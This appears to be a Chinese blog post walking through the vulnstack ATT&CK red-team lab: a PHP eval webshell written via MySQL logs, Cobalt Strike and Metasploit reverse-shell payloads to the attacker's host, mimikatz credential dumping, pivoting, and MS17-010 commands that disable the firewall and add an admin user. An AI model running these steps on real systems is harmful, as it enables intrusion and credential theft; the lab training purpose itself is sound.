@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="vulnstack-ATT&amp;CK红队实战靶场一红日安全团队分享的实战靶机一下载地址http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnstack-ATT&amp;CK红队实战靶场一">
+<meta property="og:url" content="http://example.com/2021/08/18/vulnstack-ATT&CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%B8%80/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="vulnstack-ATT&amp;CK红队实战靶场一红日安全团队分享的实战靶机一下载地址http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/g9sc834BIz7maY5.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/pYE8vfLImN3WdiT.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/PydfWIgxK73MNUR.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/QCNXta73jpdwleY.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/ofOZjeuJK2HMPbF.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/x7B8vklsdhnIPfR.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/By1Sh9zbNc4UWeQ.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/WrVnmXY4SxKZ5yD.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/TS4GtiW6aNrxcI2.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/aetd7k9hiEIFNu2.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/SVXGdFi81gtq5pa.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/HBmEwLVfjpQkXAR.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/HO8isU1g3LVflAn.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/SE5NOUu3KkRtpdI.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/3FqvRBUabWfZ6Sj.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/JhNoYy9LuDObaxi.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/SwjMc4Wa1ybDleH.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/MjkLAZmgJxcI4YQ.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/9RiKZ7gHwUT5jqe.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/FqeTd8R2DxCKE5z.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/VXGWRhwPfaYku2U.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/meWOPcGE76IykRt.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/eEWuxvO5jy7B4TC.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/3G27LHneE4jfBDt.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/kD5HmGzohwb6BSF.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/TXAED5l9jhacmMS.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/IYS3n92aABRmDZF.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/pNnEfWsMmSxkteT.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/AlzgQmJ9L1t2Yau.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/7DJv6TNHdAu3OPm.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/N4ErJ6R5GIwM1HW.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/xnCNER3PyotrwfQ.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/wMIHVYoUEQSq2cz.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/ulAZLyrC9qsTBJo.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/HZc6Tur1JWj8Yk3.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/pbqLnTi9wDY3rdv.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/6CcPWNi879Io1ET.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/18/M3FqvyoG9thpDmn.png">
+<meta property="article:published_time" content="2021-08-18T09:03:28.000Z">
+<meta property="article:modified_time" content="2021-08-18T09:39:11.329Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/08/18/g9sc834BIz7maY5.png">
+
+<link rel="canonical" href="http://example.com/2021/08/18/vulnstack-ATT&CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%B8%80/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>vulnstack-ATT&CK红队实战靶场一 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/18/vulnstack-ATT&CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%B8%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnstack-ATT&CK红队实战靶场一
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-18 17:03:28 / 修改时间：17:39:11" itemprop="dateCreated datePublished" datetime="2021-08-18T17:03:28+08:00">2021-08-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="vulnstack-ATT-amp-CK红队实战靶场一"><a href="#vulnstack-ATT-amp-CK红队实战靶场一" class="headerlink" title="vulnstack-ATT&amp;CK红队实战靶场一"></a>vulnstack-ATT&amp;CK红队实战靶场一</h1><p>红日安全团队分享的实战靶机一下载地址<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
+<span id="more"></span>
+
+<h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><img src="https://i.loli.net/2021/08/18/g9sc834BIz7maY5.png"  style="zoom:80%;" />
+
+<ul>
+<li>攻击机kali：外网192.168.112.132</li>
+<li>win7：内网192.168.176.143 外网192.168.112.164</li>
+<li>win2003：内网192.168.176.141</li>
+<li>win2008：内网192.168.176.138</li>
+</ul>
+<p>确保同网段主机相互ping通，win7作为webserver开启phpstudy</p>
+<h2 id="二、web攻击"><a href="#二、web攻击" class="headerlink" title="二、web攻击"></a>二、web攻击</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>用nmap探测同网段的目标</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sP 192.168.112.0/24</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/pYE8vfLImN3WdiT.png"  style="zoom:80%;" />
+
+<p>扫描到目标主机192.168.112.164，继续nmap探测</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.112.164</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/PydfWIgxK73MNUR.png"  style="zoom:80%;" />
+
+<p>dirsearch扫描站点目录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.112.164</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/QCNXta73jpdwleY.png" style="zoom:80%;" />
+
+<p>发现有phpmyadmin后台管理和网站备份文件</p>
+<h3 id="mysql数据库getshell"><a href="#mysql数据库getshell" class="headerlink" title="mysql数据库getshell"></a>mysql数据库getshell</h3><p>从phpstudy探针获取站点的绝对路径</p>
+<img src="https://i.loli.net/2021/08/18/ofOZjeuJK2HMPbF.png" style="zoom: 80%;" />
+
+<p>弱口令root-root进入phpmyadmin后台，通过后台上传webshell，首先查看mysql用户权限</p>
+<img src="https://i.loli.net/2021/08/18/x7B8vklsdhnIPfR.png"  style="zoom:80%;" />
+
+<p>执行命令查看secure_file_priv</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> &quot;secure_file_priv&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/By1Sh9zbNc4UWeQ.png"  style="zoom:80%;" />
+
+<p>secure_file_priv为NULL无法进行文件写入，使用SELECT INTO OUTFILE方法无效，方法二，使用日志上传webshell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%general%&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/WrVnmXY4SxKZ5yD.png" style="zoom:80%;" />
+
+<p>打开日志功能，将日志文件更改为可连接的路径c:/phpstudy/WWW/webshell.php</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>;	#打开日志写入功能</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;c:/phpstudy/WWW/webshell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/TS4GtiW6aNrxcI2.png" style="zoom:80%;" />
+
+<p>向日志中写入webshell，并用菜刀连接</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php @eval($_GET[&#x27;cmd&#x27;]);?&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/aetd7k9hiEIFNu2.png"  style="zoom:80%;" />
+
+<h3 id="通过yxcms-getshell"><a href="#通过yxcms-getshell" class="headerlink" title="通过yxcms getshell"></a>通过yxcms getshell</h3><p>在路径扫描时发现网站备份文件beifen.rar，从中获取信息，进入网站<a target="_blank" rel="noopener" href="http://192.168.112.164/yxcms/%EF%BC%8C%E5%9C%A8%E4%B8%BB%E9%A1%B5%E9%9D%A2%E6%89%BE%E5%88%B0%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%EF%BC%8C%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0">http://192.168.112.164/yxcms/，在主页面找到网站后台相关信息，进入后台</a></p>
+<img src="https://i.loli.net/2021/08/18/SVXGdFi81gtq5pa.png" style="zoom:80%;" />
+
+<p>在前台模板发现能够创建和编辑页面，创建一个一句话木马的php文件</p>
+<img src="https://i.loli.net/2021/08/18/HBmEwLVfjpQkXAR.png" style="zoom:80%;" />
+
+<p>访问创建的php木马，路径从备份文件中搜索，<a target="_blank" rel="noopener" href="http://192.168.112.164/yxcms/protected/apps/default/view/default/new_shell.php%EF%BC%8C%E8%8F%9C%E5%88%80%E8%BF%9E%E6%8E%A5%E5%8D%B3%E5%8F%AF">http://192.168.112.164/yxcms/protected/apps/default/view/default/new_shell.php，菜刀连接即可</a></p>
+<h2 id="三、内网渗透"><a href="#三、内网渗透" class="headerlink" title="三、内网渗透"></a>三、内网渗透</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>webshell上传cs生成的木马，在命令行运行木马</p>
+<img src="https://i.loli.net/2021/08/18/HO8isU1g3LVflAn.png" style="zoom:80%;" />
+
+<p>目标在cs上线</p>
+<img src="https://i.loli.net/2021/08/18/SE5NOUu3KkRtpdI.png" style="zoom:80%;" />
+
+<p>依次执行以下命令，获取信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo		//获取操作系统版本，补丁信息</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/3FqvRBUabWfZ6Sj.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/JhNoYy9LuDObaxi.png" style="zoom:80%;" />
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all	//查看所属域</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/SwjMc4Wa1ybDleH.png" style="zoom:80%;" />
+
+<p> 查看域信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net view /domain 判断存在域</span><br><span class="line">net user /domain 当前域里面的用户</span><br><span class="line">net group &quot;Domain Admins&quot; /domain 查询域管理员账户</span><br><span class="line">net group &quot;Domain Controllers&quot; /domain 查询域控制器</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/MjkLAZmgJxcI4YQ.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/9RiKZ7gHwUT5jqe.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/FqeTd8R2DxCKE5z.png" style="zoom:80%;" />
+
+<p>内网主机探测</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/VXGWRhwPfaYku2U.png" style="zoom:80%;" />
+
+<p>cs命令探测</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/meWOPcGE76IykRt.png" style="zoom:80%;" />
+
+<p>总结：</p>
+<p>OWA 192.168.176.138为域控，STU1为本机，ROOT-TVI862UBEH 192.168.176.141为域成员，域管理员用户为administrator和liukaifeng01</p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>cs提权，获得system权限</p>
+<img src="https://i.loli.net/2021/08/18/eEWuxvO5jy7B4TC.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/3G27LHneE4jfBDt.png" style="zoom:80%;" />
+
+<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>运行mimikatz，获取密钥</p>
+<img src="https://i.loli.net/2021/08/18/kD5HmGzohwb6BSF.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/TXAED5l9jhacmMS.png" style="zoom:80%;" />
+
+<h4 id="SMB-Beacon"><a href="#SMB-Beacon" class="headerlink" title="SMB Beacon"></a>SMB Beacon</h4><p>由于攻击机无法与内网的主机进行直接通信，所以用到SMB Beacon</p>
+<p>首先，利用SMB服务可以通过明文或hash传递来远程执行，条件是445服务端口开放，探测内网445端口开放情况</p>
+<img src="https://i.loli.net/2021/08/18/IYS3n92aABRmDZF.png" style="zoom:80%;" />
+
+<p>其他两条主机均开放445端口</p>
+<p>新建smb监听器</p>
+<img src="https://i.loli.net/2021/08/18/pNnEfWsMmSxkteT.png" style="zoom:80%;" />
+
+<p>用psexec和刚才窃取的令牌对域控进行smb连接</p>
+<img src="https://i.loli.net/2021/08/18/AlzgQmJ9L1t2Yau.png" style="zoom:80%;" />
+
+<p>拿到域控OWA 192.168.112.138的权限</p>
+<img src="https://i.loli.net/2021/08/18/7DJv6TNHdAu3OPm.png" style="zoom:80%;" />
+
+<p>重复之前的步骤，可以获得另一台主机192.168.176.141的权限</p>
+<img src="https://i.loli.net/2021/08/18/N4ErJ6R5GIwM1HW.png" style="zoom:80%;" />
+
+<p>到这里渗透基本结束，除了用cs进行渗透，也可用msf</p>
+<h3 id="MSF实现内网漫游"><a href="#MSF实现内网漫游" class="headerlink" title="MSF实现内网漫游"></a>MSF实现内网漫游</h3><p>kali中运行msf生成木马</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.112.132 LPORT=4444 -f exe &gt; /tmp/msf.exe</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/08/18/xnCNER3PyotrwfQ.png" style="zoom:80%;" />
+
+<p>msf监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.112.132</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>webshell上传木马并运行，msf连接成功</p>
+<img src="https://i.loli.net/2021/08/18/wMIHVYoUEQSq2cz.png" style="zoom:80%;" />
+
+<p>进行信息收集之后执行mimikatz（kiwi）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">load mimikatz	</span><br><span class="line">creds_msv		//获取密码hash值</span><br><span class="line">creds_kerberos	//获取密码明文</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="https://i.loli.net/2021/08/18/ulAZLyrC9qsTBJo.png" style="zoom:80%;" />
+
+<h4 id="路由转发"><a href="#路由转发" class="headerlink" title="路由转发"></a>路由转发</h4><p>获取主机路由信息，并添加内网的路由，目的是为了让msf的流量转发到内网</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">route 		//查看路由地址</span><br><span class="line">background	//回退到msf</span><br><span class="line">route add 192.168.176.0 255.255.255.0 1	//对sessions添加内网的路由</span><br><span class="line">route print	//查看路由表</span><br></pre></td></tr></table></figure>
+
+<p>也可使用<code>post/multi/manage/autoroute</code>模块自动添加路由，接下来用proxychains实现内网漫游</p>
+<img src="https://i.loli.net/2021/08/18/HZc6Tur1JWj8Yk3.png" style="zoom:80%;" />
+
+<h4 id="漏洞发现利用"><a href="#漏洞发现利用" class="headerlink" title="漏洞发现利用"></a>漏洞发现利用</h4><p>使用nmap对目标192.168.176.138和192.168.176.141进行扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo proxychains nmap -sT -Pn -p22,80,443,135,445 --script=smb-vuln-ms17-010.nse 192.168.176.138</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>注意：</strong>由于proxychains无法代理icmp的数据包 所以必须添加-Pn参数 即不检测主机是否存活 直接进行端口tcp扫描</p>
+</blockquote>
+<p>发现均开放445端口，存在ms17-010漏洞</p>
+<blockquote>
+<p>其他msf扫描模块<br>auxiliary/scanner/portscan　    端口扫描<br>scanner/portscan/syn　　        SYN端口扫描<br>scanner/portscan/tcp　　        TCP端口扫描<br>auxiliary/scanner/smb/smb_ms17_010 </p>
+</blockquote>
+<img src="https://i.loli.net/2021/08/18/pbqLnTi9wDY3rdv.png" style="zoom:80%;" />
+
+<p>使用msf的代理之后就不能使用反向shell了，我们需要使用正向shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//执行shell命令</span><br><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">set RHOSTS 192.168.176.138</span><br><span class="line">set COMMAND netsh advfirewall set allprofiles state off	//关闭防火墙</span><br><span class="line">set command net user zqh !@#123qwe!@# /add 				//添加用户</span><br><span class="line">set command net localgroup administrators zqh /add 		//管理员权限</span><br><span class="line">set command &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;			//打开3389</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">//ms17-010漏洞利用</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set rhosts 192.168.176.138</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>但是ms17_010_eternalblue会使win2008宕机重启，且仅适用于x64系统，这里添加管理员用户，用远程桌面登录，也可用之前mimikatz获取的用户登录</p>
+<img src="https://i.loli.net/2021/08/18/6CcPWNi879Io1ET.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/M3FqvyoG9thpDmn.png" style="zoom:80%;" />
+
+<p>最后exploit/windows/smb/ms17_010_psexec反弹shell，可获取更多信息</p>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><p><a target="_blank" rel="noopener" href="http://blog.leanote.com/post/snowming/8b7ce0f84c03">http://blog.leanote.com/post/snowming/8b7ce0f84c03</a></p>
+<p><a target="_blank" rel="noopener" href="https://v0w.top/2020/07/19/vulnstack1">https://v0w.top/2020/07/19/vulnstack1</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cxyzjd.com/article/u014029795/117375754">https://www.cxyzjd.com/article/u014029795/117375754</a></p>
+<p><a target="_blank" rel="noopener" href="http://47.100.93.13/index.php/archives/909/">http://47.100.93.13/index.php/archives/909/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/liliyuanshangcao/p/13743389.html">https://www.cnblogs.com/liliyuanshangcao/p/13743389.html</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>John Doe
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2021/08/18/vulnstack-ATT&CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%B8%80/" title="vulnstack-ATT&amp;CK红队实战靶场一">http://example.com/2021/08/18/vulnstack-ATT&CK红队实战靶场一/</a>
+  </li>
+  <li class="post-copyright-license">
